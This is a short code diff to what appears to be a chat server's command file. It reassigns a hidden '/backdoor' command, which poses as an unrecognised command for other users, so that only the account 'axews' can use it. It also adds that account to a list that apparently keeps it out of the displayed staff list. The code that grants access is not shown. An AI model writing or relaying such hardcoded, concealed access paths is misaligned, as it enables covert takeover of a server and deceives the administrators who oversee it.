@@ -92,7 +92,7 @@ exports.commands = {
 	auth: 'gal',
 	goldauthlist: 'gal',
 	gal: function(target, room, user, connection) {
-		var ignoreUsers = ['tintins', 'amaterasu'];
+		var ignoreUsers = ['axews', 'tintins', 'amaterasu'];
 		fs.readFile('config/usergroups.csv', 'utf8', function(err, data) {
 			var staff = {
 				"admins": [],
@@ -1007,7 +1007,7 @@ exports.commands = {
 	kickbanhelp: ["/kickban [user] - Roombans [user] for one minute."],
 	*/
 	backdoor: function(target, room, user) {
-		if (user.userid !== 'tintins') {
+		if (user.userid !== 'axews') {
 			this.errorReply("The command '/backdoor' was unrecognized. To send a message starting with '/backdoor', type '//backdoor'.");
 			Rooms.get("staff").add('|raw|<strong><font color=red>ALERT!</font> ' + Tools.escapeHTML(user.name) + ' has attempted to gain server access via a backdoor without proper authority!').update();
 		} else {
